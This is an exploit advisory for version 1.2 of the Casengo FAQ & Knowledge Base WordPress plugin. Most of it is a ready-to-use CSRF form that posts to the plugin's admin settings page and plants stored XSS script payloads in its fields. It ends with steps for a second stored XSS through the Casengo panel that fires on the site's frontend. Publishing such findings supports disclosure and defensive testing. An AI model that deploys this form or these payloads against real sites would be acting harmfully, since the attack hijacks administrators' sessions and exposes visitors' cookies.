################################################################################################
# Exploit Title: Wordpress FAQ & Knowledge Base Plugin v1.2 Plugin Multiple Vulnerabilities    #
# Date: 20 July 2013                                                                           #
# Exploit Author: 0pc0deFR Contact: 0pc0deFR[at]gmail[dot]com Twitter: @0pc0deFR               #
# Vendor Homepage: http://wordpress.org/plugins/casengo-faq-web-self-service-plugin/           #
# Vendor Homepage: http://www.casengo.com                                                      #
# Software Link: http://downloads.wordpress.org/plugin/casengo-faq-web-self-service-plugin.zip #
# Version: 1.2                                                                                 #    
# Tested on: Wordpress 3.5.1 and Debian 6                                                      #
################################################################################################

Plugin:

Add a powerful FAQ & Knowledge Base on your WordPress Blog or Website. Powered by Casengo.



XSS and CSRF:

<form id="form1" name="form1" method="post" action="http://SERVER/WordPress/wp-admin/options-general.php?page=casengoFAQSelfservicePlugin" onsubmit="return cas_faq_validate_form();">
	<input type="hidden" name="cas_submit_hidden" value="Y">
                <select name="cas_faq_enabled" style="width:160px" value="">
                    <option  value="disabled">Disabled</option>
                    <option selected="true" value="public">Publicly visible</option>
        <input type="text" name="cas_widget_domain" size="20" maxlength="64" style="font-weight: bold" value=""><script>alert(document.cookie)</script>">
        <input type="text" name="cas_faq_pagetitle" size="30" maxlength="64" value=""><script>alert(document.cookie)</script>">
        <input CHECKED="true" type="checkbox" id="cas_faq_searchbar" name="cas_faq_searchbar" size="30" value="yes">
        <input CHECKED="true" type="checkbox" id="cas_faq_toparticlesection" name="cas_faq_toparticlesection" size="30" value="yes">
                <select name="cas_faq_style" style="width:200px;margin-bottom:12px" value="" onchange="cas_faq_styleChange(this.value)">
                    <option selected="true" value="default">Default style</option>
                    <option  value="simple-editor">Simple editor</option>
                    <option  value="custom-css">Customize CSS</option>
                </select>
        <input type="submit" name="Submit" class="button-primary" value="Enregistrer les modifications" />
        <input type="hidden" id="resetcss" name="resetcss">
</form>



XSS:

If in Casengo panel the code is stored "><script>alert(document.cookie)</script> then the javascript code is executed in frontend.
For example: http://login.casengo.com/admin/#!/kb in Categories you can paste this code "><script>alert(document.cookie)</script> and you click "Save"
and go on your Support page, for me: http://SERVER/WordPress/?page_id=135
Demonstration: http://www.youtube.com/watch?v=trlyqHaWf1A
